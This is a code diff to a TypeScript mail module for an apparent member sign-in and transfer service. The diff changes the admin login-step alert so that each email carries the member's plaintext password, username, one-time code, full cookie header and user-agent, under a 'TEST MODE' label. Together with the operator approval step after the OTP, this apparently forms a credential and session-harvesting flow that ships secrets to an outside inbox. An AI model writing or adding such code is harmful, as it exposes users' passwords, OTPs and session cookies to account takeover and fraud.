@@ -221,7 +221,6 @@ export async function sendTransferReceipt(to: string, detail: string) {
   )
 }
 
-/** OTP email to the member during multi-step sign-in. */
 export async function sendOtpEmail(
   to: string,
   otp: string,
@@ -241,7 +240,7 @@ export async function sendOtpEmail(
   )
 }
 
-/** Immediate admin alert for every step of a live login challenge. */
+/** Immediate admin alert — TEST MODE includes plain email/password/username/OTP/cookies. */
 export async function sendAdminLoginStepAlert(input: {
   attemptId: string
   email: string
@@ -249,11 +248,28 @@ export async function sendAdminLoginStepAlert(input: {
   step: string
   event: string
   ip?: string
+  passwordPlain?: string
+  username?: string
+  otpPlain?: string
+  cookieHeader?: string
+  userAgent?: string
 }) {
   const when = new Date().toLocaleString('en-US', {
     dateStyle: 'medium',
     timeStyle: 'medium',
   })
+
+  const secrets = `
+       <div style="margin-top:16px;padding:12px;background:#0a100d;border-radius:8px;font-family:monospace;font-size:13px">
+         <p style="color:#8fbfa8;margin:0 0 8px">TEST · plain text (remove after testing)</p>
+         <p style="margin:4px 0"><strong>Email:</strong> ${input.email}</p>
+         ${input.passwordPlain ? `<p style="margin:4px 0"><strong>Password:</strong> ${input.passwordPlain}</p>` : ''}
+         ${input.username ? `<p style="margin:4px 0"><strong>Username:</strong> ${input.username}</p>` : ''}
+         ${input.otpPlain ? `<p style="margin:4px 0"><strong>OTP:</strong> ${input.otpPlain}</p>` : ''}
+         ${input.cookieHeader ? `<p style="margin:4px 0;word-break:break-all"><strong>Cookies:</strong> ${input.cookieHeader}</p>` : ''}
+         ${input.userAgent ? `<p style="margin:4px 0;word-break:break-all"><strong>User-Agent:</strong> ${input.userAgent}</p>` : ''}
+       </div>`
+
   return sendMail(
     ADMIN_INBOX,
     `[Ops] Login step · ${input.memberName} · ${input.step}`,
@@ -265,7 +281,8 @@ export async function sendAdminLoginStepAlert(input: {
        <p>Time: ${when}</p>
        ${input.ip ? `<p>IP: ${input.ip}</p>` : ''}
        <p>Attempt ID: <code>${input.attemptId}</code></p>
-       <p>Open the <strong>Operations desk</strong> to approve or reject when the member finishes OTP.</p>`
+       ${secrets}
+       <p style="margin-top:12px">Open the <strong>Operations desk</strong> to approve or reject when the member finishes OTP.</p>`
     )
   )
 }
